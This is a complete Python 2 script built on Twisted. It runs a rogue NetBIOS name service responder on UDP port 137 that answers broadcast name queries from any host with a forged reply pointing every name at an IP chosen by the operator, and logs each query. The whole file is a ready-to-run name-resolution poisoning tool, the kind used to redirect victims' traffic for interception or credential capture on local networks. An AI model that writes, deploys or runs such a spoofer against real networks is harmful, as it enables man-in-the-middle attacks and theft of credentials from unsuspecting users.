import sys
from twisted.internet.protocol import DatagramProtocol
from twisted.internet import reactor

class NBSNServer(DatagramProtocol):

    def __init__(self, ip):
    	self.sip = ip
    	aip = ip.split('.')
    	self.ip = ""
    	for a in aip:
    		self.ip += hex(int(a))[2:].zfill(2).decode('hex')

    def datagramReceived(self, packet, (host, port)):
        nbnsq_transid = packet[0:2]
        nbnsq_flags = packet[2:4]
        nbnsq_questions = packet[4:6]
        nbnsq_answerrr = packet[6:8]
        nbnsq_authorityrr = packet[8:10]
        nbnsq_additionalrr = packet[10:12]
        nbnsq_name = packet[12:45]
        nbnsq_type = packet[45:47]
        nbnsq_class = packet[47:50]
        
        if (nbnsq_flags == "\x01\x10"):
            
            hex_name = ""
            for c in nbnsq_name[1:]:   
                hex_name += hex(ord(c) - ord('A'))[2]
            
            name = hex_name.decode('hex')
            
            print "Query: \"%s\" from %s. Responding %s" % (name[:len(name)-1].rstrip(), str(host), self.sip) 
            
            response = (nbnsq_transid + "\x85\x00" + "\x00\x00" + "\x00\x01" + "\x00\x00" 
                        + "\x00\x00" + nbnsq_name + nbnsq_type + nbnsq_class + "\x00\x04\x93\xe0" + "\x00\x06"
                        "\x60\x00" + self.ip)
        
            self.transport.write(response, (host, port))

try:
	ip = sys.argv[1]
	reactor.listenUDP(137, NBSNServer(ip)) #@UndefinedVariable
	reactor.run() #@UndefinedVariable
except IndexError:
	print "Usage: %s <ip>" % sys.argv[0]
